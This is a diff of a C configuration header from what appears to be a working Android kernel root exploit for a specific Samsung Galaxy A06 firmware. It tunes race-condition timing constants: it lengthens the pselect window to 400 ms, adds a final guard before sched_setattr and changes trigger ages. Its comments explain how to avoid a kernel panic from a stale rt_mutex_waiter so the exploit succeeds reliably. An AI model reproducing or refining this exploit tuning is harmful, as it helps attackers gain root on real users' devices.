@@ -2,7 +2,7 @@
 #define OFFSET_H
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
-#define BUILD_VARIANT_LABEL "a06-A065FXXSCCZF1-app-virtbase-physical-p0-20msx8-safe4-fops-safe"
+#define BUILD_VARIANT_LABEL "a06-A065FXXSCCZF1-app-virtbase-physical-p0-20msx8-safe4-fops-safe-finalguard"
 #define APP_PHYS_P0_ORACLE 1
 #define APP_PHYS_VIRTUAL_BASE_ORACLE 1
 #define APP_REQUIRE_FRESH_P0_SESSION 1
@@ -18,8 +18,18 @@
 #define SLIDE_PSELECT_READY_TIMEOUT_USEC 30000
 #define SLIDE_PSELECT_RECHECK_TIMEOUT_USEC 30000
 #define SLIDE_PSELECT_WCHAN_CONFIRMATIONS 3
-#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 200000
+#define APP_PSELECT_TRIGGER_MAX_AGE_USEC 300000
 #define APP_PSELECT_POST_GUARD_AGE_CHECK 1
+/*
+ * Point-blank re-verification directly before sched_setattr (no sleep in
+ * between).  The ready/guard checks + usleep(delay) can take up to
+ * ~150 ms (90 ms delay + 2x 30 ms checks); the pselect window must be
+ * strictly larger so the waiter cannot have already left do_select when
+ * the priority kick fires.  A stale real stack rt_mutex_waiter whose
+ * ->lock is NULL then panics the kernel in
+ * rt_mutex_adjust_prio_chain/_raw_spin_trylock.
+ */
+#define SLIDE_PSELECT_FINAL_GUARD 1
 #else
 #define BUILD_VARIANT_LABEL "a06-A065FXXSCCZF1-root-umh"
 #endif
@@ -56,7 +66,15 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define ROUTE_WAIT_SECONDS 8
 #define PSELECT_ENTER_DELAY_USEC 50000
-#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+/*
+ * pselect must stay alive longer than the whole consumer trigger path
+ * (ready wait + usleep(delay) + guard wait + point-blank check).  Worst
+ * case is ~150 ms; use 400 ms so the waiter is guaranteed to still be
+ * inside do_select when sched_setattr fires (a 100 ms window let the
+ * pselect return first, leaving a stale real stack rt_mutex_waiter with
+ * a NULL ->lock -> kernel panic in rt_mutex_adjust_prio_chain).
+ */
+#define SLIDE_PSELECT_TIMEOUT_NSEC 400000000L
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
